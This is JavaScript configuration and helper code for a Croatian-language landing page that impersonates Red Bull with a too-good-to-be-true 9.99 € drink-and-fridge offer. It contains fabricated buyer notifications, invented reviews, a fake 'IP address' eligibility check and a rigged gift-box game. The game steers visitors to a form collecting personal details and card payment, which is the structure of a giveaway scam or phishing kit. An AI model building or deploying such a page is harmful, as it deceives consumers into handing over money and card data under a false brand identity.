const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href;
const baseHref = window.location.protocol + '//' + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "hr";
  const lang = "hr-HR";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Veličina: ",
    arr: []
  };

  const mainProduct = {
    header: "Ograničena ponuda",
    name: "24-dijelni set Red Bull energetskih pića + markirani hladnjak",
    oldPrice: "50,00 €",
    newPrice: "9,99 €",
    selectText: "",
    text: `
        Ovaj set Red Bull energetskih pića neće vas ostaviti ravnodušnima! Energija i radost koje ovo energetsko piće pruža, dat će vam snagu cijeli dan. A hladnjak čuva njegov okus i svježinu, tako da možete uživati u okusu u bilo koje vrijeme.
    <br><br>
       Najpopularnije piće kojem ne možete odoljeti!
    <br><br>
        Požurite i iskoristite ovu ograničenu priliku!`,
  };

  const notifications = [
    {
      user: "Ivan S*****",
      location: "Zagreb, Hrvatska",
      action: "Upravo sam kupio sjajan set za 9,99 €!",
      timeago: "Prije 15 sekundi",
    },
    {
      user: "Marko B******",
      location: "Split, Hrvatska",
      action: "Upravo sam kupio sjajan set za 9,99 €!",
      timeago: "Prije 25 sekundi",
    },
  ];

  const reviewsArr = [
    {
      name: "Jakov",
      time: "Prije 1 dan",
      header: "Koristan uređaj!",
      product: "26468782",
      review: "Ovaj hladnjak je praktičan, kompaktan i zauzima vrlo malo prostora. Postavio sam ga u ured i sada uvijek mogu napuniti s hladnim pićem",
    },
    {
      name: "Noa",
      time: "Prije 5 dana",
      header: "Savršen energetski poticaj!",
      product: "26468782",
      review: "Set je vrlo lijep, isprva nisam mogao vjerovati da može imati tako nisku cijenu, ali stigao je u komadu, hvala RedBull na ovoj akciji!",
    },
    {
      name: "Elias",
      time: "Prije 2 dana",
      header: "Omiljeno energetsko piće!",
      product: "26468782",
      review: "Volim Red Bull, stalno pijem energetska pića.",
    },
    {
      name: "David",
      time: "Prije 3 dana",
      header: "Ovo je najbolji energetski napitak!",
      product: "26468782",
      review: "Nikada nisam sumnjao u kvalitetu ovog pića, tako je bogat i ugodan za nepce, a hladnjak se savršeno uklopio u moj interijer.",
    },
    {
      name: "Ivan",
      time: "Prije 5 dana",
      header: "Pobjeda je na mojoj strani!",
      product: "26468782",
      review: "Uvijek sam znao da mogu osvojiti ovu akciju jer volim energetska pića.",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "",
    percent: "",
    rec: "Komentari na ovu akciju",
  };

  const questions = {
    _of: "Pitanje {1}/{2}:",
    arr: [
      {
        q: "Jeste li već kupovali Red Bull proizvode?",
        a: ["DA", "NE"],
      },
      {
        q: "Za koga je ovaj set?",
        a: [
          "za obitelj",
          "za prijatelja",
          "za mene"
        ],
      },
      {
        q: "Biste li preporučili naše proizvode svojim prijateljima?",
        a: ["DA", "NE"],
      },
    ],
  };

  const check = {
    title: "Vaš odgovor će biti pregledan.",
    arr: [
      "3/3. Odgovorili ste na pitanje.",
      "Vaša IP adresa ne pokazuje prethodne narudžbe.",
      "Vaš odgovor je potvrđen.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Čestitamo, potvrdili ste da ste stvarna osoba",
        button: "OK",
        text: `
        <center>
        Danas, {date}, imate priliku osvojiti set od 24 Red Bull energetska pića + markirani hladnjak.
          <br><br>
        Potrebno je samo odabrati pravu poklon kutiju.
          <br><br>
        Imate 3 pokušaja, sretno!
        </center>
      `,
      },
    },
    first: {
      texts: {
        header: "Ah, ne...",
        button: "OK",
        text: `
        <center>
      Nažalost, ovaj poklon je prazan! Imate još 2 pokušaja, sretno!
        </center>
      `,
      },
    },
    win: {
      texts: {
        header: "Čestitamo! Osvojili ste!",
        button: "OK",
        text: `
        <center>
          <p style="color: #000">
           Osvojili ste „24-dijelni set Red Bull energetskih pića“ + markirani hladnjak
          </p>
          <br>
            1) Kliknite "OK" da biste prešli na stranicu za dostavu.
            <br><br>
            2) Ispunite obrazac i platite narudžbu uzimajući u obzir vaš osobni popust.
            <br><br>
            3) Paket će biti dostavljen u roku od 2-3 dana.
        </center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Osobni podaci",
      fields: {
        name: {
          field: "Ime",
        },
        family: {
          field: "Prezime",
        },
        phone: {
          field: "Telefonski broj",
        },
        email: {
          field: "E-mail",
        },
      },
    },
    delivery: {
      title: "Dostava",
      fields: {
        city: {
          field: "Grad",
        },
        address: {
          field: "Adresa za dostavu",
        },
        zip: {
          field: "Poštanski broj",
        },
      },
    },
    payment: {
      title: "Način plaćanja",
      creditCard: "Online plaćanje karticom",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Pregled narudžbe",
      oldPrice: "50,00 €",
      newPrice: "9,99 €",
      size: "Veličina",
      subTotal: {
        title: "Ukupno bez dostave",
        amount: "9,99 €",
      },
      delivery: {
        title: "Dostava",
        amount: "0,00 €",
      },
      total: {
        title: "Ukupno",
        amount: "9,99 €",
      },
      checkoutButton: "Naručite",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "",
      miniImg: "./assets/sl_1.png",
      images: [
        "./assets/sl_1.png",
        "./assets/r1.jpeg",
        "./assets/r2.jpeg",
        "./assets/r3.jpg",
        "./assets/sl_4.jpg",
        "./assets/sl_5.jpg",
      ]
    }
  ];

  const footer = {
    cr: "© 2024 RedBull. Sva prava pridržana.",
  };



  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value = mainProduct.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
